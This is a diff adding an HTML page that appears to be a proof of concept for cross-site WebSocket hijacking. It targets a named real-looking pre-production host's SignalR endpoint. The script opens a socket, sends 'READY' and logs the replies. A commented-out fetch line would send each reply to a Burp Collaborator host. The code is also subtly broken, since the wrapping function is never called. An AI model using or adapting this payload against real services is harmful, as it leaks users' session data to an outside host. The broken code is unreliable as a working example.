@@ -1,0 +1,22 @@
+<html>
+<body>
+<script>
+(function(){
+
+  var webSocket = new WebSocket("https://preprod.hub.knightfrank.com/api/signalr/negotiate");
+  
+  webSocket.onopen = function (evt) {
+      webSocket.send("READY")
+  }
+
+  webSocket.onmessage = function (evt) {
+      var message = evt.data;
+console.log(message);
+    //fetch('https://vgfamw2l43liob8pjxkm6wjfg6mwal.burpcollaborator.net/?'+evt.data, {mode: 'no-cors'});
+  }
+
+
+});
+</script>
+</body>
+</html>
